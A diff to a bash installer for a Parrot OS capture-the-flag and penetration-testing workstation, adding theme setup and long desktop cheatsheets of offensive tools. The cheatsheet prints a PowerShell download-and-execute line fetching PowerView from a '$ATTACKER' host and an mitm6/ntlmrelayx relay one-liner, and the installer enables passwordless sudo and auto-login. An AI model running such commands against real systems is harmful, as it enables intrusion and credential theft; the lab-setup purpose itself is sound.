@@ -248,73 +248,96 @@ if ! id "$USERNAME" &>/dev/null; then
     passwd -d "$USERNAME" || true
     log_info "User '$USERNAME' created"
     
-    # Copy Parrot OS default configuration from /etc/skel
+    # Copy Parrot OS default configuration - Method 1: From /etc/skel
     log_info "Applying Parrot OS default configuration..."
     if [[ -d "/etc/skel" ]]; then
-        cp -r /etc/skel/. "$USER_HOME/" 2>/dev/null || true
-        log_info "Copied Parrot default configs from /etc/skel"
+        cp -rn /etc/skel/. "$USER_HOME/" 2>/dev/null || true
+        log_info "Copied base configs from /etc/skel"
     fi
     
-    # Restore Parrot wallpaper if it exists
-    if [[ -f "/usr/share/backgrounds/parrot/default.jpg" ]]; then
-        mkdir -p "$USER_HOME/.config"
-        # MATE Desktop wallpaper
-        mkdir -p "$USER_HOME/.config/dconf"
-        sudo -u "$USERNAME" bash << 'WALLPAPER_EOF'
+    # Copy Parrot OS default configuration - Method 2: From default 'user' account if it exists
+    if [[ -d "/home/user" ]] && [[ "$USERNAME" != "user" ]]; then
+        log_info "Copying Parrot defaults from 'user' account..."
+        # Copy MATE/desktop configs
+        [[ -d "/home/user/.config/mate" ]] && cp -rn /home/user/.config/mate "$USER_HOME/.config/" 2>/dev/null || true
+        [[ -d "/home/user/.config/dconf" ]] && cp -rn /home/user/.config/dconf "$USER_HOME/.config/" 2>/dev/null || true
+        # Copy other config directories that might have Parrot defaults
+        [[ -f "/home/user/.gtkrc-2.0" ]] && cp /home/user/.gtkrc-2.0 "$USER_HOME/" 2>/dev/null || true
+        [[ -d "/home/user/.themes" ]] && cp -rn /home/user/.themes "$USER_HOME/" 2>/dev/null || true
+        log_info "Copied Parrot configs from default user account"
+    fi
+    
+    chown -R "$USERNAME":"$USERNAME" "$USER_HOME" 2>/dev/null || true
+    
+    # Explicitly set Parrot theme using gsettings for the new user
+    log_info "Configuring Parrot theme for $USERNAME..."
+    sudo -u "$USERNAME" bash << PARROT_THEME_EOF
 export DISPLAY=:0
-export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"
+export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/\$(id -u)/bus"
+
 if command -v gsettings &>/dev/null; then
-    gsettings set org.mate.background picture-filename '/usr/share/backgrounds/parrot/default.jpg' 2>/dev/null || true
-fi
-WALLPAPER_EOF
-        log_info "Parrot wallpaper configured"
+    # MATE Desktop - Parrot defaults
+    gsettings set org.mate.interface gtk-theme 'Parrot' 2>/dev/null || gsettings set org.mate.interface gtk-theme 'Arc-Darker' 2>/dev/null || true
+    gsettings set org.mate.interface icon-theme 'Papirus' 2>/dev/null || gsettings set org.mate.interface icon-theme 'Papirus-Dark' 2>/dev/null || true
+    gsettings set org.mate.Marco.general theme 'Parrot' 2>/dev/null || gsettings set org.mate.Marco.general theme 'Arc-Darker' 2>/dev/null || true
+    
+    # Parrot wallpaper
+    if [[ -f "/usr/share/backgrounds/parrot/default.jpg" ]]; then
+        gsettings set org.mate.background picture-filename '/usr/share/backgrounds/parrot/default.jpg' 2>/dev/null || true
+    elif [[ -f "/usr/share/backgrounds/parrot/parrot.jpg" ]]; then
+        gsettings set org.mate.background picture-filename '/usr/share/backgrounds/parrot/parrot.jpg' 2>/dev/null || true
     fi
     
-    # Add terminal shortcut to MATE panel (Parrot default)
-    sudo -u "$USERNAME" bash << 'PANEL_EOF'
-export DISPLAY=:0
-export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"
-if command -v gsettings &>/dev/null && command -v mate-session &>/dev/null; then
-    # Get existing panel objects
-    existing=$(gsettings get org.mate.panel general object-id-list 2>/dev/null || echo "[]")
+    # Panel configuration
+    gsettings set org.mate.panel.menubar icon-name 'start-here' 2>/dev/null || true
     
-    # Add terminal launcher if not present
-    if ! echo "$existing" | grep -q "terminal-launcher"; then
-        # Add terminal launcher to panel
-        gsettings set org.mate.panel.object:/org/mate/panel/objects/terminal-launcher/ launcher-location '/usr/share/applications/mate-terminal.desktop' 2>/dev/null || true
-        gsettings set org.mate.panel.object:/org/mate/panel/objects/terminal-launcher/ object-type 'launcher' 2>/dev/null || true
-        gsettings set org.mate.panel.object:/org/mate/panel/objects/terminal-launcher/ toplevel-id 'top' 2>/dev/null || true
-        gsettings set org.mate.panel.object:/org/mate/panel/objects/terminal-launcher/ position 100 2>/dev/null || true
-        
-        # Update object list
-        new_list=$(echo "$existing" | sed "s/\]/, 'terminal-launcher']/")
-        gsettings set org.mate.panel general object-id-list "$new_list" 2>/dev/null || true
-    fi
+    # Terminal configuration - keep Parrot's terminal look
+    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/default/ use-theme-colors false 2>/dev/null || true
+    
+    echo "[+] Parrot theme configured for $USERNAME"
 fi
-PANEL_EOF
-    log_info "MATE panel terminal shortcut configured"
+PARROT_THEME_EOF
+    
+    log_info "Parrot OS defaults applied to $USERNAME"
     
 else
     log_skip "User '$USERNAME' already exists"
     
-    # Even if user exists, ensure Parrot defaults are applied
-    if [[ ! -f "$USER_HOME/.config/parrot-configured" ]]; then
-        log_info "Applying Parrot defaults to existing user..."
+    # Even if user exists, ensure Parrot defaults are applied if not already done
+    if [[ ! -f "$USER_HOME/.config/ctfbox-parrot-configured" ]]; then
+        log_info "Applying Parrot defaults to existing user $USERNAME..."
         
-        # Restore wallpaper
-        if [[ -f "/usr/share/backgrounds/parrot/default.jpg" ]]; then
-            sudo -u "$USERNAME" bash << 'WALLPAPER2_EOF'
-export DISPLAY=:0
-export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"
-if command -v gsettings &>/dev/null; then
-    gsettings set org.mate.background picture-filename '/usr/share/backgrounds/parrot/default.jpg' 2>/dev/null || true
-fi
-WALLPAPER2_EOF
+        # Copy from default user if available
+        if [[ -d "/home/user" ]] && [[ "$USERNAME" != "user" ]]; then
+            [[ -d "/home/user/.config/mate" ]] && cp -rn /home/user/.config/mate "$USER_HOME/.config/" 2>/dev/null || true
+            [[ -d "/home/user/.config/dconf" ]] && cp -rn /home/user/.config/dconf "$USER_HOME/.config/" 2>/dev/null || true
         fi
         
+        # Set Parrot theme explicitly
+        sudo -u "$USERNAME" bash << PARROT_THEME2_EOF
+export DISPLAY=:0
+export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/\$(id -u)/bus"
+
+if command -v gsettings &>/dev/null; then
+    gsettings set org.mate.interface gtk-theme 'Parrot' 2>/dev/null || gsettings set org.mate.interface gtk-theme 'Arc-Darker' 2>/dev/null || true
+    gsettings set org.mate.interface icon-theme 'Papirus' 2>/dev/null || gsettings set org.mate.interface icon-theme 'Papirus-Dark' 2>/dev/null || true
+    gsettings set org.mate.Marco.general theme 'Parrot' 2>/dev/null || gsettings set org.mate.Marco.general theme 'Arc-Darker' 2>/dev/null || true
+    
+    if [[ -f "/usr/share/backgrounds/parrot/default.jpg" ]]; then
+        gsettings set org.mate.background picture-filename '/usr/share/backgrounds/parrot/default.jpg' 2>/dev/null || true
+    elif [[ -f "/usr/share/backgrounds/parrot/parrot.jpg" ]]; then
+        gsettings set org.mate.background picture-filename '/usr/share/backgrounds/parrot/parrot.jpg' 2>/dev/null || true
+    fi
+fi
+PARROT_THEME2_EOF
+        
         # Mark as configured
-        touch "$USER_HOME/.config/parrot-configured"
-        chown "$USERNAME":"$USERNAME" "$USER_HOME/.config/parrot-configured"
+        mkdir -p "$USER_HOME/.config"
+        touch "$USER_HOME/.config/ctfbox-parrot-configured"
+        chown -R "$USERNAME":"$USERNAME" "$USER_HOME/.config"
+        log_info "Parrot defaults applied"
+    else
+        log_skip "Parrot defaults already applied to $USERNAME"
     fi
 fi
 
@@ -1208,29 +1231,229 @@ log_progress "Phase 9: Creating Desktop Documentation"
 # COMMANDS.txt
 if [[ ! -f "$USER_HOME/Desktop/COMMANDS.txt" ]]; then
     cat > "$USER_HOME/Desktop/COMMANDS.txt" << 'DOC_EOF'
-CTFBOX v3.6 — QUICK COMMANDS
------------------------------------------
-newengagement <n> → Create engagement
-quickscan <ip> → Nmap quick
-extract <file> → Universal unpack
-reset → ~/Desktop/RESET_CTF_BOX.sh
-update → ~/scripts/update-tools.sh
+╔═══════════════════════════════════════════════════════════════╗
+║              CTFBOX v3.6 — COMPREHENSIVE CHEATSHEET          ║
+╚═══════════════════════════════════════════════════════════════╝
 
-john → crack with rockyou
-hashcat → GPU NTLM cracking
-sqlmap → run sqlmap tool
-runas → wine ~/tools/windows/runasCs.exe
-win → cd ~/tools/windows
-host → cd /media/sf_ctf-tools (VirtualBox shared folder)
+══════════════════════════════════════════════════════════════
+ CUSTOM FUNCTIONS (Type function name + args)
+══════════════════════════════════════════════════════════════
+newengagement <name>    Create new engagement folder structure
+                        → ~/engagements/<name>/{recon,scans,exploits,loot,notes,screenshots}
 
-mitm-relay → mitm6 + ntlmrelayx combo
-evil → evil-winrm -i target
-wl-dir → directory-list-2.3-medium.txt
+quickscan <target>      Fast nmap scan with timestamp
+                        → nmap -sV -sC -O -oA quickscan_TIMESTAMP <target>
 
-FIREFOX:
-~/install-firefox-extensions.sh → Install Firefox addons
+extract <file>          Universal archive extractor
+                        → Supports: .tar.gz, .zip, .7z, .rar, .bz2, etc.
+
+══════════════════════════════════════════════════════════════
+ NAVIGATION SHORTCUTS
+══════════════════════════════════════════════════════════════
+tools                   cd ~/tools
+repos                   cd ~/tools/repos
+wordlists               cd ~/tools/wordlists
+scripts                 cd ~/tools/scripts
+engagements             cd ~/engagements
+win                     cd ~/tools/windows
+host                    cd /media/sf_ctf-tools (VirtualBox shared folder)
+
+══════════════════════════════════════════════════════════════
+ SYSTEM ALIASES
+══════════════════════════════════════════════════════════════
+ll                      ls -lah (detailed list)
+...                     cd ../.. (up two directories)
+c                       clear
+h                       history
+please                  sudo
+rl                      rlwrap nc (netcat with readline)
+
+══════════════════════════════════════════════════════════════
+ PENTESTING TOOLS
+══════════════════════════════════════════════════════════════
+nmap-quick <target>     nmap -sV -sC -O <target>
+nmap-full <target>      nmap -sV -sC -O -p- <target>
+nmap-udp <target>       nmap -sU -sV <target>
+
+serve                   python3 -m http.server (port 8000)
+serve80                 sudo python3 -m http.server 80
+
+myip                    curl -s ifconfig.me && echo
+ports                   netstat -tulanp
+listening               lsof -i -P -n | grep LISTEN
+
+hash <hash>             hashid <hash>
+shell                   python3 ~/penelope.py (reverse shell handler)
+
+══════════════════════════════════════════════════════════════
+ CRACKING TOOLS
+══════════════════════════════════════════════════════════════
+john <hash_file>        john --wordlist=~/tools/wordlists/rockyou.txt
+hashcat <hash>          hashcat -m 1000 (NTLM mode by default)
+sqlmap                  sqlmap (SQL injection tool)
+
+══════════════════════════════════════════════════════════════
+ TOOL SHORTCUTS
+══════════════════════════════════════════════════════════════
+nxc                     netexec (CrackMapExec fork)
+cme                     netexec
+smb <target>            netexec smb <target>
+winrm <target>          netexec winrm <target>
+
+bloodhound              bloodhound-python
+peas                    linpeas.sh
+ysoserial               java -jar ~/tools/ysoserial.jar
+evil                    evil-winrm
+ldump                   ldapdomaindump
+runas                   wine ~/tools/windows/runasCs.exe
+
+══════════════════════════════════════════════════════════════
+ WINDOWS TOOLS (~/tools/windows/)
+══════════════════════════════════════════════════════════════
+rubeus                  ~/tools/windows/Rubeus.exe
+sharphound              ~/tools/windows/SharpHound.exe
+seatbelt                ~/tools/windows/Seatbelt.exe
+
+powerview               Load PowerView.ps1 via PowerShell
+                        → IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER/PowerView.ps1')
+
+══════════════════════════════════════════════════════════════
+ IMPACKET SHORTCUTS (All .py scripts)
+══════════════════════════════════════════════════════════════
+secretsdump             secretsdump.py
+getnpusers              GetNPUsers.py (ASREPRoast)
+getuserspns             GetUserSPNs.py (Kerberoast)
+psexec                  psexec.py
+smbexec                 smbexec.py
+wmiexec                 wmiexec.py
+ntlmrelayx              ntlmrelayx.py
+
+══════════════════════════════════════════════════════════════
+ WORDLIST SHORTCUTS
+══════════════════════════════════════════════════════════════
+wl-common               ~/tools/wordlists/SecLists/Discovery/Web-Content/common.txt
+wl-dir                  ~/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+wl-users                ~/tools/wordlists/SecLists/Usernames/Names/names.txt
+wl-pass                 ~/tools/wordlists/rockyou.txt
+wl-params               ~/tools/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+
+══════════════════════════════════════════════════════════════
+ CHISEL TUNNELING
+══════════════════════════════════════════════════════════════
+chisel-server           chisel server --reverse --port 8000
+chisel-client           chisel client
+
+══════════════════════════════════════════════════════════════
+ COMBO ATTACKS
+══════════════════════════════════════════════════════════════
+mitm-relay              sudo mitm6 -d DOMAIN & ntlmrelayx.py -t ldaps://DC-IP -wh attacker-ip --delegate-access
+
+══════════════════════════════════════════════════════════════
+ FIREFOX
+══════════════════════════════════════════════════════════════
+~/install-firefox-extensions.sh
+    Installs: Dark Reader, Cookie Editor, FoxyProxy, Wappalyzer, 
+              HackTools, User-Agent Switcher
+
+══════════════════════════════════════════════════════════════
+ SYSTEM SCRIPTS
+══════════════════════════════════════════════════════════════
+~/Desktop/RESET_CTF_BOX.sh
+    Reset system: Archives history, wipes creds, clears /etc/hosts,
+                  Kerberos tickets, SSH known_hosts
+
+~/scripts/update-tools.sh
+    Update: System packages, Python tools, Go tools, Nuclei templates,
+            Ruby gems, Git repos
+
+~/Desktop/RESTORE_PARROT_DEFAULTS.sh
+    Restore: Parrot wallpaper, theme, panel configuration
+
+══════════════════════════════════════════════════════════════
+ ENVIRONMENT VARIABLES
+══════════════════════════════════════════════════════════════
+$GOPATH                 ~/go
+$PATH                   Includes: ~/go/bin, ~/.local/bin
+$EDITOR                 vim
+
+══════════════════════════════════════════════════════════════
+ CONVENIENCE SYMLINKS
+══════════════════════════════════════════════════════════════
+~/SecLists              → ~/tools/wordlists/SecLists
+~/linpeas.sh            → ~/tools/repos/PEASS-ng/linPEAS/linpeas.sh
+~/winpeas.exe           → ~/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe
+~/penelope.py           → ~/tools/repos/penelope/penelope.py
+
+══════════════════════════════════════════════════════════════
+ DIRECTORY STRUCTURE
+══════════════════════════════════════════════════════════════
+~/tools/
+  ├── wordlists/
+  │   ├── SecLists/
+  │   └── rockyou.txt
+  ├── scripts/
+  ├── exploits/
+  ├── repos/
+  │   ├── PayloadsAllTheThings/
+  │   ├── PEASS-ng/
+  │   ├── HackTricks/
+  │   ├── AutoRecon/
+  │   ├── impacket/
+  │   ├── nuclei-templates/
+  │   ├── GitTools/
+  │   ├── Windows-Exploit-Suggester/
+  │   ├── PowerSploit/
+  │   ├── GTFOBins.github.io/
+  │   ├── LOLBAS/
+  │   ├── RsaCtfTool/
+  │   └── penelope/
+  └── windows/
+      ├── runasCs.exe
+      ├── Rubeus.exe
+      ├── SharpHound.exe
+      ├── Seatbelt.exe
+      └── PowerView.ps1
+
+~/engagements/
+  └── <engagement-name>/
+      ├── recon/
+      ├── scans/
+      ├── exploits/
+      ├── loot/
+      ├── notes/
+      └── screenshots/
+
+~/go/bin/
+  Go tools: naabu, httpx, nuclei, subfinder, katana, dnsx, ffuf,
+            gobuster, kerbrute, chisel, gauplus, windapsearch, 
+            pre2k, ligolo-ng (proxy & agent)
+
+~/.local/bin/
+  pipx tools: netexec, ldapdomaindump, sprayhound, RsaCtfTool
+
+══════════════════════════════════════════════════════════════
+ QUICK START WORKFLOW
+══════════════════════════════════════════════════════════════
+1. newengagement <target>
+2. quickscan <target-ip>
+3. cd ~/engagements/<target>
+4. Start attacking!
+
+══════════════════════════════════════════════════════════════
+ PRO TIPS
+══════════════════════════════════════════════════════════════
+• Nuclei templates auto-update in background on shell startup
+• All aliases work in scripts and interactive shells
+• VirtualBox shared folder: Just type 'host'
+• Reset system between engagements with RESET_CTF_BOX.sh
+• Update all tools with ~/scripts/update-tools.sh
+• Chisel binaries available for both server and client modes
+• Impacket scripts installed globally via pip
+• NetExec (nxc) is the new CrackMapExec
+
+══════════════════════════════════════════════════════════════
 DOC_EOF
-    log_info "Created COMMANDS.txt"
+    log_info "Created comprehensive COMMANDS.txt cheatsheet"
 else
     log_skip "COMMANDS.txt already exists"
 fi
@@ -1238,29 +1461,284 @@ fi
 # TOOL_LOCATIONS.txt
 if [[ ! -f "$USER_HOME/Desktop/TOOL_LOCATIONS.txt" ]]; then
     cat > "$USER_HOME/Desktop/TOOL_LOCATIONS.txt" << EOF
-CTFBOX v3.6 — TOOL MAP
------------------------------------------
-USER: $USERNAME
-HOME: $USER_HOME
-GOPATH: $USER_HOME/go
+╔═══════════════════════════════════════════════════════════════╗
+║         CTFBOX v3.6 — ENVIRONMENT & TOOL LOCATIONS           ║
+╚═══════════════════════════════════════════════════════════════╝
 
-Go Tools: $USER_HOME/go/bin/
-Python: pipx + global
-Ruby: evil-winrm, one_gadget
-Windows: $USER_HOME/tools/windows/
+══════════════════════════════════════════════════════════════
+ USER CONFIGURATION
+══════════════════════════════════════════════════════════════
+Username:               $USERNAME
+Home Directory:         $USER_HOME
+Shell:                  Zsh with Oh-My-Zsh + Powerlevel10k
+Go Path:                $USER_HOME/go
 
-VirtualBox:
-  Copy-Paste: Ctrl+C/V (bidirectional)
-  Drag & Drop: Enabled
-  Shared Folder: /media/sf_ctf-tools → alias host
+══════════════════════════════════════════════════════════════
+ ENVIRONMENT VARIABLES SET IN ~/.zshrc
+══════════════════════════════════════════════════════════════
+export PATH=\$PATH:\$HOME/go/bin:\$HOME/.local/bin
+export EDITOR=vim
+export GOPATH=\$HOME/go
 
-Key Files:
-  ~/.zshrc
-  ~/scripts/update-tools.sh
-  ~/Desktop/RESET_CTF_BOX.sh
-  ~/tools/windows/runasCs.exe
+Zsh Plugins Enabled:
+  • git
+  • zsh-autosuggestions (type suggestions as you go)
+  • zsh-syntax-highlighting (command validation)
+  • docker (Docker completions)
+  • sudo (Press ESC twice to add sudo)
+  • history (Enhanced history search)
+  • command-not-found (suggests package to install)
+
+══════════════════════════════════════════════════════════════
+ GO TOOLS ($USER_HOME/go/bin/)
+══════════════════════════════════════════════════════════════
+Located at: $USER_HOME/go/bin/
+
+Recon & Enumeration:
+  • naabu                Port scanner
+  • httpx                HTTP probe
+  • nuclei               Vulnerability scanner
+  • subfinder            Subdomain enumeration
+  • katana               Web crawler
+  • dnsx                 DNS toolkit
+  • gauplus              URL gatherer
+  • windapsearch         Active Directory enumeration
+
+Web:
+  • ffuf                 Fuzzer
+  • gobuster             Directory/DNS bruteforcer
+
+Post-Exploitation:
+  • kerbrute             Kerberos enumeration
+  • chisel               Tunneling tool
+  • ligolo-ng (proxy)    Advanced tunneling
+  • ligolo-ng (agent)    Tunneling agent
+  • pre2k                Pre-Windows 2000 attacks
+
+══════════════════════════════════════════════════════════════
+ PYTHON TOOLS (pip3 + pipx)
+══════════════════════════════════════════════════════════════
+Global pip3 packages:
+  • impacket             Complete suite (secretsdump, psexec, etc)
+  • hashid               Hash identifier
+  • bloodhound           BloodHound ingestor
+  • bloodyAD             Active Directory attacks
+  • mitm6                IPv6 MITM
+  • responder            LLMNR/NBT-NS/MDNS poisoner
+  • certipy-ad           AD certificate attacks
+  • coercer              Coerce NTLM auth
+  • pypykatz             Mimikatz in Python
+  • lsassy               Dump lsass remotely
+  • enum4linux-ng        SMB enumeration
+  • dnsrecon             DNS enumeration
+  • git-dumper           Dump .git repos
+  • roadrecon            Azure AD recon
+  • manspider            Filesystem spider
+  • mitmproxy            HTTPS proxy
+  • pwntools             Exploit dev framework
+  • ROPgadget            ROP chain builder
+  • truffleHog           Secret scanner
+
+pipx isolated tools (~/.local/bin/):
+  • netexec (nxc)        CrackMapExec fork
+  • ldapdomaindump       LDAP dumper
+  • sprayhound           Password spraying
+  • RsaCtfTool           RSA attack toolkit
+
+══════════════════════════════════════════════════════════════
+ RUBY TOOLS (gem)
+══════════════════════════════════════════════════════════════
+  • one_gadget           One-shot RCE gadgets
+  • haiti-hash           Hash identifier
+  • evil-winrm           WinRM shell
+
+══════════════════════════════════════════════════════════════
+ WINDOWS TOOLS ($USER_HOME/tools/windows/)
+══════════════════════════════════════════════════════════════
+Located at: $USER_HOME/tools/windows/
+
+Compiled Binaries:
+  • runasCs.exe          RunAs with credentials
+  • Rubeus.exe           Kerberos toolkit
+  • SharpHound.exe       BloodHound collector
+  • Seatbelt.exe         System enumeration
+
+PowerShell Scripts:
+  • PowerView.ps1        AD enumeration
+
+Access via:
+  • Alias: 'win' → cd ~/tools/windows
+  • Direct: rubeus, sharphound, seatbelt aliases
+
+══════════════════════════════════════════════════════════════
+ WORDLISTS ($USER_HOME/tools/wordlists/)
+══════════════════════════════════════════════════════════════
+Primary Wordlists:
+  • rockyou.txt          14M password list
+  • SecLists/            Complete SecLists repo
+
+Quick Access Aliases:
+  • wl-common            Common.txt
+  • wl-dir               Directory-list-2.3-medium.txt
+  • wl-users             Names.txt
+  • wl-pass              rockyou.txt
+  • wl-params            Burp-parameter-names.txt
+
+Symlink:
+  • ~/SecLists → ~/tools/wordlists/SecLists
+
+══════════════════════════════════════════════════════════════
+ REPOSITORIES ($USER_HOME/tools/repos/)
+══════════════════════════════════════════════════════════════
+Knowledge Bases:
+  • PayloadsAllTheThings  Payload reference
+  • HackTricks            Pentesting wiki
+  • GTFOBins.github.io    Unix binaries
+  • LOLBAS                Windows binaries
+
+Tools:
+  • PEASS-ng              linPEAS/winPEAS
+  • AutoRecon             Automated recon
+  • impacket              Impacket source
+  • nuclei-templates      Nuclei templates
+  • GitTools              .git exploitation
+  • Windows-Exploit-Suggester
+  • PowerSploit           PowerShell toolkit
+  • RsaCtfTool            RSA attacks
+  • penelope              Reverse shell handler
+
+Quick Access:
+  • ~/linpeas.sh → linPEAS
+  • ~/winpeas.exe → winPEAS
+  • ~/penelope.py → Penelope
+
+══════════════════════════════════════════════════════════════
+ VIRTUALBOX INTEGRATION
+══════════════════════════════════════════════════════════════
+Features Enabled:
+  ✓ Bidirectional clipboard (Ctrl+C/V between host/VM)
+  ✓ Drag & Drop files
+  ✓ Shared folders
+  ✓ Auto-resize display
+
+Shared Folder Access:
+  • Path: /media/sf_ctf-tools
+  • Alias: 'host' → cd /media/sf_ctf-tools
+  • Setup: VirtualBox → Settings → Shared Folders
+
+══════════════════════════════════════════════════════════════
+ FIREFOX EXTENSIONS (~/.firefox-extensions/)
+══════════════════════════════════════════════════════════════
+Auto-Installed via Enterprise Policy:
+  • Dark Reader          Auto dark mode
+  • Cookie Editor        Cookie manipulation
+  • FoxyProxy            Proxy switcher
+  • Wappalyzer           Tech detection
+  • HackTools            Pentesting reference
+  • User-Agent Switcher  UA spoofing
+
+Manual Installer: ~/install-firefox-extensions.sh
+Policy Location: /usr/lib/firefox/distribution/policies.json
+
+Firefox Preferences Set:
+  • DevTools theme: Dark
+  • Cache: Memory only (no disk)
+  • Tracking protection: Disabled
+  • DNS-over-HTTPS: Disabled
+  • Downloads: ~/Downloads
+
+══════════════════════════════════════════════════════════════
+ CONFIGURATION FILES
+══════════════════════════════════════════════════════════════
+Shell Configuration:
+  • ~/.zshrc             Main config (aliases, functions, env vars)
+  • ~/.p10k.zsh          Powerlevel10k theme config
+  • ~/.oh-my-zsh/        Oh-My-Zsh installation
+
+Firefox:
+  • ~/.mozilla/firefox/user.js.template
+  • ~/.firefox-extensions/*.xpi
+
+Scripts:
+  • ~/scripts/update-tools.sh            Update everything
+  • ~/install-firefox-extensions.sh     Firefox addons
+  • ~/Desktop/RESET_CTF_BOX.sh           System reset
+  • ~/Desktop/RESTORE_PARROT_DEFAULTS.sh Restore theme
+
+Logs:
+  • /var/log/ctfbox-install.log         Installation log
+
+══════════════════════════════════════════════════════════════
+ CUSTOM SHELL FUNCTIONS (Defined in ~/.zshrc)
+══════════════════════════════════════════════════════════════
+newengagement <n>
+  Creates: ~/engagements/<n>/{recon,scans,exploits,loot,notes,screenshots}
+  Auto-creates: notes/README.md
+  Auto-navigates to engagement directory
+
+quickscan <target>
+  Runs: nmap -sV -sC -O -oA quickscan_TIMESTAMP <target>
+  Saves: Output with timestamp
+
+extract <file>
+  Intelligently extracts any archive format
+  Supports: .tar.gz, .tar.bz2, .zip, .7z, .rar, .gz, etc.
+
+══════════════════════════════════════════════════════════════
+ SYSTEM INTEGRATION
+══════════════════════════════════════════════════════════════
+User Groups:
+  • sudo                 Full admin access
+  • docker               Docker without sudo
+  • nopasswdlogin        No password login
+
+Services:
+  • Docker               Running
+  • SSH                  Available
+
+Passwordless Sudo:
+  • Enabled for: $USERNAME
+  • Config: /etc/sudoers.d/$USERNAME
+
+Auto-Login:
+  • Configured for: $USERNAME
+  • Display Manager: LightDM/GDM3/SDDM
+
+══════════════════════════════════════════════════════════════
+ BACKGROUND PROCESSES
+══════════════════════════════════════════════════════════════
+Auto-Started on Shell Launch:
+  • Nuclei template updates (silent background)
+
+VirtualBox (if in VM):
+  • VBoxClient --clipboard
+  • VBoxClient --draganddrop
+
+══════════════════════════════════════════════════════════════
+ PARROT OS THEME
+══════════════════════════════════════════════════════════════
+GTK Theme:              Parrot (or Arc-Darker fallback)
+Icon Theme:             Papirus / Papirus-Dark
+Window Manager Theme:   Parrot (or Arc-Darker fallback)
+Wallpaper:              /usr/share/backgrounds/parrot/default.jpg
+
+Restore Script: ~/Desktop/RESTORE_PARROT_DEFAULTS.sh
+
+══════════════════════════════════════════════════════════════
+ QUICK REFERENCE
+══════════════════════════════════════════════════════════════
+View all aliases:       alias
+View all functions:     typeset -f
+View PATH:              echo \$PATH
+Test Go tools:          ls ~/go/bin/
+Test Python tools:      pip3 list
+Check services:         systemctl status docker
+
+═══════════════════════════════════════════════════════════════
+ For complete command reference, see: ~/Desktop/COMMANDS.txt
+═══════════════════════════════════════════════════════════════
 EOF
-    log_info "Created TOOL_LOCATIONS.txt"
+    log_info "Created comprehensive TOOL_LOCATIONS.txt"
 else
     log_skip "TOOL_LOCATIONS.txt already exists"
 fi
@@ -1403,6 +1881,7 @@ echo -e "${CYAN}Features:${NC}"
 echo -e "  • Smart installation (skips existing)"
 echo -e "  • Resume capability"
 echo -e "  • Better error handling"
+echo -e "  • ${GREEN}Comprehensive documentation${NC} on Desktop"
 echo -e "${CYAN}Firefox Extensions:${NC}"
 echo -e "  • Dark Reader, Cookie Editor, FoxyProxy"
 echo -e "  • Wappalyzer, HackTools, User-Agent Switcher"
@@ -1411,11 +1890,17 @@ echo -e "${CYAN}Cracking:${NC} john, hashcat"
 echo -e "${CYAN}Web:${NC} sqlmap"
 echo -e "${CYAN}Windows:${NC} runasCs.exe, Rubeus, SharpHound"
 echo -e "${CYAN}VirtualBox:${NC} Copy-Paste + Drag & Drop + Shared Folder"
-echo -e "${CYAN}Reset:${NC} ~/Desktop/RESET_CTF_BOX.sh"
-echo -e "${CYAN}Update:${NC} ~/scripts/update-tools.sh"
+echo -e "${CYAN}Documentation:${NC}"
+echo -e "  • ~/Desktop/${GREEN}COMMANDS.txt${NC} - Complete alias/function reference"
+echo -e "  • ~/Desktop/${GREEN}TOOL_LOCATIONS.txt${NC} - Environment mapping"
+echo -e "  • ~/Desktop/${GREEN}FIREFOX_EXTENSIONS.txt${NC} - Extension guide"
+echo -e "${CYAN}Scripts:${NC}"
+echo -e "  • ~/Desktop/RESET_CTF_BOX.sh"
+echo -e "  • ~/Desktop/RESTORE_PARROT_DEFAULTS.sh"
+echo -e "  • ~/scripts/update-tools.sh"
 echo ""
 echo -e "${YELLOW}IMPORTANT:${NC} Reboot required to log in as ${GREEN}$USERNAME${NC}"
-echo -e "${YELLOW}After reboot:${NC} Open Firefox, extensions auto-install (or run script)"
+echo -e "${YELLOW}After reboot:${NC} Check ~/Desktop/ for comprehensive documentation"
 echo ""
 read -p "Reboot now? (y/n): " reboot_choice
 if [[ "$reboot_choice" =~ ^[Yy]$ ]]; then
